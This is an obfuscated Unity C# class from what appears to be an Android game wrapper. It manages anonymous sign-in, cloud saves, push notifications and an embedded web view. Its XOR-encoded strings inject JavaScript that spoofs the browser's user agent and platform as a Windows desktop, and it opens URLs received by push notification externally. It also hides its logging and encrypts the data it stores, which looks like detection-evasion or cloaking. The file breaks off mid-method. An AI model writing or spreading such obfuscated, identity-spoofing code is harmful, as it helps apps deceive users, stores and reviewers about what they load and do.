using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0x4b3048ae : MonoBehaviour
{
    private async Task<string> _0xd41dca0b(int _0x8649a69b = 5, int _0xc3321bd2 = 500)
    {
        try
        {
            List<EntityData> _0x54825524 = new List<EntityData>();
            int _0xcaead5f8 = 0;
            do
            {
                _0x54825524 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x1ef3e38c._0xdf7d4e91(new byte[8] { 233, 245, 248, 224, 252, 235, 208, 253 }, 153), _0x38800619, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x38800619 }), new QueryOptions())).ToList();
                await Task.Delay(_0xc3321bd2);
            }
            while (_0x54825524.Count == 0 && _0xcaead5f8++ < _0x8649a69b);
            {
#if B_LOGS
                {
                    Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[33] { 240, 255, 206, 216, 223, 246, 139, 248, 202, 221, 206, 207, 139, 231, 194, 197, 192, 139, 250, 222, 206, 217, 210, 139, 217, 206, 216, 222, 199, 223, 216, 145, 139 }, 171) + JsonConvert.SerializeObject(_0x54825524, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[39] { 55, 56, 9, 31, 24, 49, 76, 63, 13, 26, 9, 8, 76, 32, 5, 2, 7, 76, 61, 25, 9, 30, 21, 76, 30, 9, 31, 25, 0, 24, 31, 76, 15, 3, 25, 2, 24, 86, 76 }, 108) + _0x54825524.Count);
                }
#endif
            }

            var _0xa5ecdb03 = _0x54825524.SelectMany(_0xda2b59ce => _0xda2b59ce.Data).FirstOrDefault(_0x0921c8fe => _0x0921c8fe.Key == _0x38800619)?.Value.GetAs<string>() ?? string.Empty;
            _0xa5ecdb03 = Decrypt(_0xa5ecdb03, _0x38800619);
            {
#if B_LOGS
                {
                    Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[24] { 224, 239, 222, 200, 207, 230, 155, 247, 212, 218, 223, 155, 200, 218, 205, 222, 223, 155, 215, 210, 213, 208, 129, 155 }, 187) + _0xa5ecdb03);
                }
#endif
            }

            return _0xa5ecdb03;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[39] { 240, 255, 206, 216, 223, 246, 139, 236, 206, 223, 139, 196, 217, 139, 219, 202, 217, 216, 206, 139, 216, 202, 221, 206, 207, 139, 199, 194, 197, 192, 139, 205, 202, 194, 199, 206, 207, 145, 139 }, 171) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private string _0xf46faa70 = "";
    private string _0x5b6592bd = "";
    private bool _0x347b7692 = false;
    private string _0x45f643e1 = "";
    private string _0x2503e242()
    {
        return _0x1ef3e38c._0xdf7d4e91(new byte[12] { 217, 151, 132, 159, 146, 133, 152, 158, 159, 217, 216, 138 }, 241) + _0x1ef3e38c._0xdf7d4e91(new byte[8] { 76, 91, 72, 26, 79, 91, 7, 29 }, 58) + WindowsDesktopUserAgent + _0x1ef3e38c._0xdf7d4e91(new byte[2] { 103, 123 }, 64) + _0x1ef3e38c._0xdf7d4e91(new byte[30] { 37, 50, 33, 115, 35, 33, 60, 39, 60, 110, 29, 50, 37, 58, 52, 50, 39, 60, 33, 125, 35, 33, 60, 39, 60, 39, 42, 35, 54, 104 }, 83) + _0x1ef3e38c._0xdf7d4e91(new byte[121] { 121, 106, 113, 124, 107, 118, 112, 113, 63, 123, 122, 121, 55, 112, 125, 117, 51, 116, 122, 102, 51, 105, 126, 115, 54, 100, 107, 109, 102, 100, 80, 125, 117, 122, 124, 107, 49, 123, 122, 121, 118, 113, 122, 79, 109, 112, 111, 122, 109, 107, 102, 55, 112, 125, 117, 51, 116, 122, 102, 51, 100, 120, 122, 107, 37, 121, 106, 113, 124, 107, 118, 112, 113, 55, 54, 100, 109, 122, 107, 106, 109, 113, 63, 105, 126, 115, 36, 98, 51, 124, 112, 113, 121, 118, 120, 106, 109, 126, 125, 115, 122, 37, 107, 109, 106, 122, 98, 54, 36, 98, 124, 126, 107, 124, 119, 55, 122, 54, 100, 98, 98 }, 31) + _0x1ef3e38c._0xdf7d4e91(new byte[26] { 37, 36, 39, 105, 49, 51, 46, 53, 46, 109, 102, 52, 50, 36, 51, 0, 38, 36, 47, 53, 102, 109, 52, 32, 104, 122 }, 65) + _0x1ef3e38c._0xdf7d4e91(new byte[130] { 13, 12, 15, 65, 25, 27, 6, 29, 6, 69, 78, 8, 25, 25, 63, 12, 27, 26, 0, 6, 7, 78, 69, 78, 92, 71, 89, 73, 65, 62, 0, 7, 13, 6, 30, 26, 73, 39, 61, 73, 88, 89, 71, 89, 82, 73, 62, 0, 7, 95, 93, 82, 73, 17, 95, 93, 64, 73, 40, 25, 25, 5, 12, 62, 12, 11, 34, 0, 29, 70, 92, 90, 94, 71, 90, 95, 73, 65, 34, 33, 61, 36, 37, 69, 73, 5, 0, 2, 12, 73, 46, 12, 10, 2, 6, 64, 73, 42, 1, 27, 6, 4, 12, 70, 88, 91, 89, 71, 89, 71, 89, 71, 89, 73, 58, 8, 15, 8, 27, 0, 70, 92, 90, 94, 71, 90, 95, 78, 64, 82 }, 105) + _0x1ef3e38c._0xdf7d4e91(new byte[30] { 38, 39, 36, 106, 50, 48, 45, 54, 45, 110, 101, 50, 46, 35, 54, 36, 45, 48, 47, 101, 110, 101, 21, 43, 44, 113, 112, 101, 107, 121 }, 66) + _0x1ef3e38c._0xdf7d4e91(new byte[34] { 205, 204, 207, 129, 217, 219, 198, 221, 198, 133, 142, 223, 204, 199, 205, 198, 219, 142, 133, 142, 238, 198, 198, 206, 197, 204, 137, 224, 199, 202, 135, 142, 128, 146 }, 169) + _0x1ef3e38c._0xdf7d4e91(new byte[30] { 118, 119, 116, 58, 98, 96, 125, 102, 125, 62, 53, 127, 115, 106, 70, 125, 103, 113, 122, 66, 125, 123, 124, 102, 97, 53, 62, 34, 59, 41 }, 18) + _0x1ef3e38c._0xdf7d4e91(new byte[449] { 84, 82, 89, 91, 86, 65, 82, 0, 85, 65, 68, 29, 91, 66, 82, 65, 78, 68, 83, 26, 123, 91, 66, 82, 65, 78, 68, 26, 7, 99, 72, 82, 79, 77, 73, 85, 77, 7, 12, 86, 69, 82, 83, 73, 79, 78, 26, 7, 17, 18, 16, 7, 93, 12, 91, 66, 82, 65, 78, 68, 26, 7, 103, 79, 79, 71, 76, 69, 0, 99, 72, 82, 79, 77, 69, 7, 12, 86, 69, 82, 83, 73, 79, 78, 26, 7, 17, 18, 16, 7, 93, 12, 91, 66, 82, 65, 78, 68, 26, 7, 110, 79, 84, 29, 97, 31, 98, 82, 65, 78, 68, 7, 12, 86, 69, 82, 83, 73, 79, 78, 26, 7, 18, 20, 7, 93, 125, 12, 77, 79, 66, 73, 76, 69, 26, 70, 65, 76, 83, 69, 12, 80, 76, 65, 84, 70, 79, 82, 77, 26, 7, 119, 73, 78, 68, 79, 87, 83, 7, 12, 71, 69, 84, 104, 73, 71, 72, 101, 78, 84, 82, 79, 80, 89, 118, 65, 76, 85, 69, 83, 26, 70, 85, 78, 67, 84, 73, 79, 78, 8, 9, 91, 82, 69, 84, 85, 82, 78, 0, 112, 82, 79, 77, 73, 83, 69, 14, 82, 69, 83, 79, 76, 86, 69, 8, 91, 65, 82, 67, 72, 73, 84, 69, 67, 84, 85, 82, 69, 26, 7, 88, 24, 22, 7, 12, 66, 73, 84, 78, 69, 83, 83, 26, 7, 22, 20, 7, 12, 77, 79, 66, 73, 76, 69, 26, 70, 65, 76, 83, 69, 12, 77, 79, 68, 69, 76, 26, 7, 7, 12, 80, 76, 65, 84, 70, 79, 82, 77, 26, 7, 119, 73, 78, 68, 79, 87, 83, 7, 12, 80, 76, 65, 84, 70, 79, 82, 77, 118, 69, 82, 83, 73, 79, 78, 26, 7, 17, 21, 14, 16, 14, 16, 7, 12, 85, 65, 102, 85, 76, 76, 118, 69, 82, 83, 73, 79, 78, 26, 7, 17, 18, 16, 14, 16, 14, 16, 14, 16, 7, 93, 9, 27, 93, 93, 27, 111, 66, 74, 69, 67, 84, 14, 68, 69, 70, 73, 78, 69, 112, 82, 79, 80, 69, 82, 84, 89, 8, 80, 82, 79, 84, 79, 12, 7, 85, 83, 69, 82, 97, 71, 69, 78, 84, 100, 65, 84, 65, 7, 12, 91, 71, 69, 84, 26, 70, 85, 78, 67, 84, 73, 79, 78, 8, 9, 91, 82, 69, 84, 85, 82, 78, 0, 85, 65, 68, 27, 93, 12, 67, 79, 78, 70, 73, 71, 85, 82, 65, 66, 76, 69, 26, 84, 82, 85, 69, 93, 9, 27, 93, 67, 65, 84, 67, 72, 8, 69, 9, 91, 93 }, 32) + _0x1ef3e38c._0xdf7d4e91(new byte[112] { 98, 99, 96, 46, 117, 101, 116, 99, 99, 104, 42, 33, 113, 111, 98, 114, 110, 33, 42, 55, 63, 52, 54, 47, 61, 98, 99, 96, 46, 117, 101, 116, 99, 99, 104, 42, 33, 110, 99, 111, 97, 110, 114, 33, 42, 55, 54, 62, 54, 47, 61, 98, 99, 96, 46, 117, 101, 116, 99, 99, 104, 42, 33, 103, 112, 103, 111, 106, 81, 111, 98, 114, 110, 33, 42, 55, 63, 52, 54, 47, 61, 98, 99, 96, 46, 117, 101, 116, 99, 99, 104, 42, 33, 103, 112, 103, 111, 106, 78, 99, 111, 97, 110, 114, 33, 42, 55, 54, 50, 54, 47, 61 }, 6) + _0x1ef3e38c._0xdf7d4e91(new byte[45] { 244, 242, 249, 251, 247, 233, 238, 228, 239, 247, 174, 239, 238, 244, 239, 245, 227, 232, 243, 244, 225, 242, 244, 189, 245, 238, 228, 229, 230, 233, 238, 229, 228, 187, 253, 227, 225, 244, 227, 232, 168, 229, 169, 251, 253 }, 128) + _0x1ef3e38c._0xdf7d4e91(new byte[721] { 85, 83, 88, 90, 87, 64, 83, 1, 78, 83, 72, 70, 28, 86, 72, 79, 69, 78, 86, 15, 76, 64, 85, 66, 73, 108, 68, 69, 72, 64, 15, 67, 72, 79, 69, 9, 86, 72, 79, 69, 78, 86, 8, 26, 86, 72, 79, 69, 78, 86, 15, 76, 64, 85, 66, 73, 108, 68, 69, 72, 64, 28, 71, 84, 79, 66, 85, 72, 78, 79, 9, 80, 8, 90, 87, 64, 83, 1, 82, 28, 114, 85, 83, 72, 79, 70, 9, 80, 8, 15, 85, 78, 109, 78, 86, 68, 83, 98, 64, 82, 68, 9, 8, 26, 72, 71, 9, 82, 15, 72, 79, 69, 68, 89, 110, 71, 9, 6, 81, 78, 72, 79, 85, 68, 83, 27, 1, 66, 78, 64, 83, 82, 68, 6, 8, 31, 28, 17, 93, 93, 82, 15, 72, 79, 69, 68, 89, 110, 71, 9, 6, 73, 78, 87, 68, 83, 27, 1, 79, 78, 79, 68, 6, 8, 31, 28, 17, 93, 93, 82, 15, 72, 79, 69, 68, 89, 110, 71, 9, 6, 76, 64, 89, 12, 86, 72, 69, 85, 73, 6, 8, 31, 28, 17, 93, 93, 82, 15, 72, 79, 69, 68, 89, 110, 71, 9, 6, 76, 64, 89, 12, 69, 68, 87, 72, 66, 68, 12, 86, 72, 69, 85, 73, 6, 8, 31, 28, 17, 8, 83, 68, 85, 84, 83, 79, 1, 90, 76, 64, 85, 66, 73, 68, 82, 27, 71, 64, 77, 82, 68, 13, 76, 68, 69, 72, 64, 27, 80, 13, 78, 79, 66, 73, 64, 79, 70, 68, 27, 79, 84, 77, 77, 13, 64, 69, 69, 109, 72, 82, 85, 68, 79, 68, 83, 27, 71, 84, 79, 66, 85, 72, 78, 79, 9, 8, 90, 92, 13, 83, 68, 76, 78, 87, 68, 109, 72, 82, 85, 68, 79, 68, 83, 27, 71, 84, 79, 66, 85, 72, 78, 79, 9, 8, 90, 92, 13, 64, 69, 69, 100, 87, 68, 79, 85, 109, 72, 82, 85, 68, 79, 68, 83, 27, 71, 84, 79, 66, 85, 72, 78, 79, 9, 8, 90, 92, 13, 83, 68, 76, 78, 87, 68, 100, 87, 68, 79, 85, 109, 72, 82, 85, 68, 79, 68, 83, 27, 71, 84, 79, 66, 85, 72, 78, 79, 9, 8, 90, 92, 13, 69, 72, 82, 81, 64, 85, 66, 73, 100, 87, 68, 79, 85, 27, 71, 84, 79, 66, 85, 72, 78, 79, 9, 8, 90, 83, 68, 85, 84, 83, 79, 1, 71, 64, 77, 82, 68, 26, 92, 92, 26, 72, 71, 9, 82, 15, 72, 79, 69, 68, 89, 110, 71, 9, 6, 81, 78, 72, 79, 85, 68, 83, 27, 1, 71, 72, 79, 68, 6, 8, 31, 28, 17, 93, 93, 82, 15, 72, 79, 69, 68, 89, 110, 71, 9, 6, 73, 78, 87, 68, 83, 27, 1, 73, 78, 87, 68, 83, 6, 8, 31, 28, 17, 8, 83, 68, 85, 84, 83, 79, 1, 90, 76, 64, 85, 66, 73, 68, 82, 27, 85, 83, 84, 68, 13, 76, 68, 69, 72, 64, 27, 80, 13, 78, 79, 66, 73, 64, 79, 70, 68, 27, 79, 84, 77, 77, 13, 64, 69, 69, 109, 72, 82, 85, 68, 79, 68, 83, 27, 71, 84, 79, 66, 85, 72, 78, 79, 9, 8, 90, 92, 13, 83, 68, 76, 78, 87, 68, 109, 72, 82, 85, 68, 79, 68, 83, 27, 71, 84, 79, 66, 85, 72, 78, 79, 9, 8, 90, 92, 13, 64, 69, 69, 100, 87, 68, 79, 85, 109, 72, 82, 85, 68, 79, 68, 83, 27, 71, 84, 79, 66, 85, 72, 78, 79, 9, 8, 90, 92, 13, 83, 68, 76, 78, 87, 68, 100, 87, 68, 79, 85, 109, 72, 82, 85, 68, 79, 68, 83, 27, 71, 84, 79, 66, 85, 72, 78, 79, 9, 8, 90, 92, 13, 69, 72, 82, 81, 64, 85, 66, 73, 100, 87, 68, 79, 85, 27, 71, 84, 79, 66, 85, 72, 78, 79, 9, 8, 90, 83, 68, 85, 84, 83, 79, 1, 71, 64, 77, 82, 68, 26, 92, 92, 26, 83, 68, 85, 84, 83, 79, 1, 78, 83, 72, 70, 9, 80, 8, 26, 92, 26, 92, 66, 64, 85, 66, 73, 9, 68, 8, 90, 92 }, 33) + _0x1ef3e38c._0xdf7d4e91(new byte[5] { 49, 101, 100, 101, 119 }, 76);
    }

    private UniWebViewPopup _0xd03ae801()
    {
        for (int _0x53f8c6f7 = _0x776a3ae9.Count - 1; _0x53f8c6f7 >= 0; _0x53f8c6f7--)
        {
            var _0x2df41cfd = _0x776a3ae9[_0x53f8c6f7];
            if (_0x2df41cfd != null && _0x2df41cfd.IsAlive)
                return _0x2df41cfd;
            _0x776a3ae9.RemoveAt(_0x53f8c6f7);
        }

        return null;
    }

    internal bool IsAboutBlank(string _0x315f4bde)
    {
        if (string.IsNullOrEmpty(_0x315f4bde))
            return false;
        return _0x315f4bde.StartsWith(_0x1ef3e38c._0xdf7d4e91(new byte[11] { 164, 167, 170, 176, 177, 255, 167, 169, 164, 171, 174 }, 197), StringComparison.OrdinalIgnoreCase);
    }

    internal string _0x4cbc9928(string _0xdf228b62)
    {
        int _0x5b14597b = _0xdf228b62.IndexOf(_0x1ef3e38c._0xdf7d4e91(new byte[3] { 39, 42, 115 }, 78), StringComparison.OrdinalIgnoreCase);
        if (_0x5b14597b < 0)
            return null;
        string _0xfb52ac48 = _0xdf228b62.Substring(_0x5b14597b + 3);
        int _0x1f778349 = _0xfb52ac48.IndexOf('&');
        return _0x1f778349 >= 0 ? _0xfb52ac48.Substring(0, _0x1f778349) : _0xfb52ac48;
    }

    private bool _0x1f470ba2 = false;
    private async Task _0xd08c2883(string _0xefcbdde8)
    {
        if (_0x347b7692 || string.IsNullOrEmpty(_0x38800619) || string.IsNullOrEmpty(_0xefcbdde8) || _0x3d14bc79)
            return;
        _0x347b7692 = true;
        try
        {
            JObject _0xc88da5ca = BuildRandomPayload(_0xefcbdde8, _0x38800619, _0x3ca11756());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0xefcbdde8} payload: {_0xc88da5ca}");
                }
#endif
            }

            var _0xf864cd3a = _0xe864bd08(_0xc88da5ca.ToString(), _0x38800619);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x1ef3e38c._0xdf7d4e91(new byte[4] { 139, 136, 134, 131 }, 231) + _0x38800619, _0xf864cd3a } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[24] { 15, 0, 17, 7, 0, 9, 116, 24, 59, 53, 48, 116, 36, 53, 39, 39, 116, 49, 38, 38, 59, 38, 110, 116 }, 84) + e.Message);
#endif
            }
        }
    }

    private string _0x98cdef26()
    {
        string _0x0a78d5a5 = _0x1ef3e38c._0xdf7d4e91(new byte[62] { 70, 69, 68, 67, 66, 65, 64, 79, 78, 77, 76, 75, 74, 73, 72, 87, 86, 85, 84, 83, 82, 81, 80, 95, 94, 93, 102, 101, 100, 99, 98, 97, 96, 111, 110, 109, 108, 107, 106, 105, 104, 119, 118, 117, 116, 115, 114, 113, 112, 127, 126, 125, 23, 22, 21, 20, 19, 18, 17, 16, 31, 30 }, 39);
        System.Random _0x3dd0f1a1 = new System.Random();
        int _0xeea19ad2 = _0x3dd0f1a1.Next(8, 16);
        return new string (Enumerable.Repeat(_0x0a78d5a5, _0xeea19ad2).Select(_0xb29b0287 => _0xb29b0287[_0x3dd0f1a1.Next(_0xb29b0287.Length)]).ToArray());
    }

    // NATIVE WEB VIEW METHODS
    private UniWebView _0xacca79f6 = null;
    private void StopCurrentFailedLoad(UniWebView _0x7ddd18a5)
    {
        _0x4a9b2c8e(false);
        if (_0x7ddd18a5 == null)
            return;
        _0x7ddd18a5.Stop();
        if (_0x7ddd18a5.CanGoBack)
            _0x7ddd18a5.GoBack();
    }

    private void OnApplicationPause(bool _0xa1855321)
    {
        isApplicationPause = _0xa1855321;
    }

    private async Task _0xb8bbe30d()
    {
        if (await _0x59e744a7())
            return;
        if (await _0xe80b3750())
            return;
        if (await _0xda692961())
            return;
        _0x916c99b0();
        await _0x0facfbcc(_0x4810d99f());
        _0x011ac354 = await _0x54a2e84b();
        await _0x97b93b3f();
    }

    private IEnumerator _0x62ea96c5(IEnumerator _0x291052c2, TaskCompletionSource<bool> _0x4edacd47)
    {
        yield return _0x291052c2;
        _0x4edacd47.SetResult(true);
    }

    private RectTransform _0x166000ef;
    // WEB VIEW LOGIC END
    internal void _0x119a17d3()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0x9eba6d04 = new AndroidNotificationChannel
        {
            Id = _0x1ef3e38c._0xdf7d4e91(new byte[15] { 175, 174, 173, 170, 190, 167, 191, 148, 168, 163, 170, 165, 165, 174, 167 }, 203),
            Name = _0x1ef3e38c._0xdf7d4e91(new byte[15] { 223, 254, 253, 250, 238, 247, 239, 187, 216, 243, 250, 245, 245, 254, 247 }, 155),
            Importance = Importance.High,
            Description = _0x1ef3e38c._0xdf7d4e91(new byte[21] { 20, 54, 61, 54, 33, 50, 63, 115, 61, 60, 39, 58, 53, 58, 48, 50, 39, 58, 60, 61, 32 }, 83)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0x9eba6d04);
        // Build notification
        var _0xfa78d98c = new AndroidNotification
        {
            Title = _0xa2435b1a[UnityEngine.Random.Range(0, _0xa2435b1a.Length)],
            Text = _0x1ef3e38c._0xdf7d4e91(new byte[21] { 103, 84, 67, 6, 95, 73, 83, 6, 85, 83, 84, 67, 6, 82, 73, 6, 67, 94, 79, 82, 25 }, 38),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0xfa78d98c, _0x1ef3e38c._0xdf7d4e91(new byte[15] { 104, 105, 106, 109, 121, 96, 120, 83, 111, 100, 109, 98, 98, 105, 96 }, 12));
    }

    private bool _0x3d14bc79 = false;
    private bool _0xb79416a1()
    {
        _0x776a3ae9.RemoveAll(_0x3543f83e => _0x3543f83e == null || !_0x3543f83e.IsAlive);
        return _0x776a3ae9.Count > 0;
    }

    internal bool IsHttpUrl(string _0x5eb48f36)
    {
        if (string.IsNullOrEmpty(_0x5eb48f36))
            return false;
        return _0x5eb48f36.StartsWith(_0x1ef3e38c._0xdf7d4e91(new byte[7] { 82, 78, 78, 74, 0, 21, 21 }, 58), StringComparison.OrdinalIgnoreCase) || _0x5eb48f36.StartsWith(_0x1ef3e38c._0xdf7d4e91(new byte[8] { 7, 27, 27, 31, 28, 85, 64, 64 }, 111), StringComparison.OrdinalIgnoreCase);
    }

    private string GetFailingUrl(UniWebViewNativeResultPayload _0xd295cdb9)
    {
        if (_0xd295cdb9 == null || _0xd295cdb9.Extra == null)
            return null;
        object _0x578df359;
        if (!_0xd295cdb9.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0x578df359))
            return null;
        return _0x578df359 as string;
    }

    private bool _0xc6ad08a5()
    {
        var _0x5844303c = Keyboard.current;
        return _0x5844303c != null && _0x5844303c.escapeKey.wasPressedThisFrame;
    }

    private void _0x8ac6d196(string _0x6fcca2b6)
    {
        Dictionary<string, object> _0x5f36d9dd;
        try
        {
            _0x5f36d9dd = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x6fcca2b6);
        }
        catch
        {
            return;
        }

        var _0x759a7c79 = ReadPushField(_0x5f36d9dd, _0x1ef3e38c._0xdf7d4e91(new byte[3] { 211, 212, 202 }, 166));
        if (string.IsNullOrWhiteSpace(_0x759a7c79))
            return;
        _0x759a7c79 = _0x759a7c79.Trim();
        if (!IsHttpUrl(_0x759a7c79))
            return;
        if (string.Equals(_0x759a7c79, _0x9c9bc2a8, StringComparison.Ordinal))
            return;
        _0x9c9bc2a8 = _0x759a7c79;
        OpenUrlExternally(_0x759a7c79);
    }

    // WEB VIEW LOGIC
    public bool _0x48f9d797 { get; set; }

    private string _0x2291ee43;
    private void _0x5bd83259()
    {
        WLog(_0x1ef3e38c._0xdf7d4e91(new byte[21] { 138, 163, 176, 166, 181, 163, 176, 167, 226, 160, 163, 161, 169, 226, 178, 176, 167, 177, 177, 167, 166 }, 194));
        if (Time.frameCount == _0xa995fb58)
            return;
        _0xa995fb58 = Time.frameCount;
        if (_0xbf809598())
            return;
        _0x38f1c524();
    }

    public void _0x1e9c5836()
    {
        if (_0x48f9d797)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[33] { 246, 249, 200, 222, 217, 240, 141, 249, 196, 192, 200, 223, 141, 194, 216, 217, 141, 128, 147, 141, 192, 194, 219, 200, 141, 217, 194, 141, 222, 206, 200, 195, 200 }, 173));
            }
#endif
        }

        _0x0ec45f13();
    }

    private bool _0x40fcc2ea = false;
    internal Vector2 lastSize = Vector2.zero;
    private string Decrypt(string _0x9eee62f6, string _0xf819e18d)
    {
        try
        {
            var _0x462de959 = Convert.FromBase64String(_0x9eee62f6);
            using var _0xf0f13e83 = Aes.Create();
            _0xf0f13e83.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xf819e18d));
            var _0x68d258f1 = new byte[16];
            Buffer.BlockCopy(_0x462de959, 0, _0x68d258f1, 0, 16);
            _0xf0f13e83.IV = _0x68d258f1;
            using var _0x0f49937b = new MemoryStream(_0x462de959, 16, _0x462de959.Length - 16);
            using var _0xec802f5a = new CryptoStream(_0x0f49937b, _0xf0f13e83.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0x2e8fc7eb = new StreamReader(_0xec802f5a, Encoding.UTF8);
            return _0x2e8fc7eb.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private string _0x793fc76b(string _0xf98df0ad, string _0xeb7a200f)
    {
        if (string.IsNullOrEmpty(_0xeb7a200f))
            return _0xf98df0ad;
        if (_0xf98df0ad.Contains(_0x1ef3e38c._0xdf7d4e91(new byte[1] { 11 }, 52)))
            return _0xf98df0ad + _0x1ef3e38c._0xdf7d4e91(new byte[8] { 5, 80, 70, 77, 71, 74, 71, 30 }, 35) + UnityWebRequest.EscapeURL(_0xeb7a200f);
        else
            return _0xf98df0ad + _0x1ef3e38c._0xdf7d4e91(new byte[8] { 208, 156, 138, 129, 139, 134, 139, 210 }, 239) + UnityWebRequest.EscapeURL(_0xeb7a200f);
    }

    internal bool isDestroyedForce = false;
    private void Awake()
    {
        if (_0x67672eae != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0x67672eae = gameObject.GetComponent<_0x4b3048ae>();
        DontDestroyOnLoad(gameObject);
        _0x517a0997 = _0x5afeb8ed = _0xbb472277 = "";
        _0xad146003 = "";
        _0x48f9d797 = false;
    }

    private ApplicationInstallMode _0x4118a231 = ApplicationInstallMode.Unknown;
    private string _0x91e0fd92 = "";
    private string _0x9c9bc2a8;
    private JObject BuildRandomPayload(params string[] _0x51e51823)
    {
        JObject _0x045ea9bd = new JObject();
        foreach (var _0x852e94bd in _0x51e51823)
        {
            string _0x651c69bf = _0x98cdef26();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0x651c69bf} val={_0x852e94bd}");
#endif
            }

            _0x045ea9bd.Add(_0x651c69bf, _0x852e94bd == null ? "" : _0x852e94bd);
        }

        return _0x045ea9bd;
    }

    private void OnDestroy()
    {
        StopAllCoroutines();
        _0x0ec45f13();
    }

    private Text _0x9d2492d1;
    private Canvas _0xfac5dc4e;
    private static bool IsPrivacyItemTrue(Item _0x485c1e78)
    {
        if (_0x485c1e78.Key != _0x1ef3e38c._0xdf7d4e91(new byte[9] { 218, 192, 227, 193, 218, 197, 210, 208, 202 }, 179))
            return false;
        try
        {
            var _0x90105b25 = _0x485c1e78.Value.GetAs<object>();
            return _0x90105b25 switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    private string _0x38800619 = "";
    private async Task<bool> _0x59e744a7()
    {
        {
#if B_LOGS
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[37] { 37, 42, 27, 13, 10, 35, 94, 45, 23, 25, 16, 55, 16, 43, 16, 23, 10, 7, 45, 27, 12, 8, 23, 29, 27, 13, 63, 16, 17, 16, 7, 19, 17, 11, 13, 18, 7 }, 126));
#endif
        }

        try
        {
            var _0xb3c3f1d1 = new InitializationOptions();
            await UnityServices.InitializeAsync(_0xb3c3f1d1);
            {
#if B_LOGS
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[32] { 165, 170, 155, 141, 138, 163, 222, 171, 144, 151, 138, 135, 173, 155, 140, 136, 151, 157, 155, 141, 222, 183, 144, 151, 138, 151, 159, 146, 151, 132, 155, 154 }, 254));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[20] { 73, 88, 78, 73, 61, 72, 115, 116, 105, 100, 78, 120, 111, 107, 116, 126, 120, 110, 39, 61 }, 29) + ex.Message);
#endif
            }

            _0x67672eae?._0x0ec45f13();
            return true;
        }

        bool _0x8f07e9d7 = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0x8f07e9d7 = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[37] { 24, 23, 38, 48, 55, 30, 99, 16, 42, 36, 45, 110, 42, 45, 99, 2, 45, 44, 45, 58, 46, 44, 54, 48, 109, 99, 19, 47, 34, 58, 38, 49, 99, 10, 7, 121, 99 }, 67) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0x38800619 = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[25] { 77, 92, 74, 77, 57, 74, 112, 126, 119, 52, 112, 119, 57, 88, 108, 109, 113, 57, 92, 75, 75, 86, 75, 35, 57 }, 25) + ex.Message);
#endif
                }

                _0x67672eae?._0x0ec45f13();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[28] { 7, 22, 0, 7, 115, 0, 58, 52, 61, 126, 58, 61, 115, 1, 54, 34, 38, 54, 32, 39, 115, 22, 1, 1, 28, 1, 105, 115 }, 83) + ex.Message);
#endif
                }

                _0x67672eae?._0x0ec45f13();
                return true;
            }
        }
        while (!_0x8f07e9d7);
        return false;
    }

    private IEnumerator RequestAndroidPermissionIfNeeded(string _0x5a146084)
    {
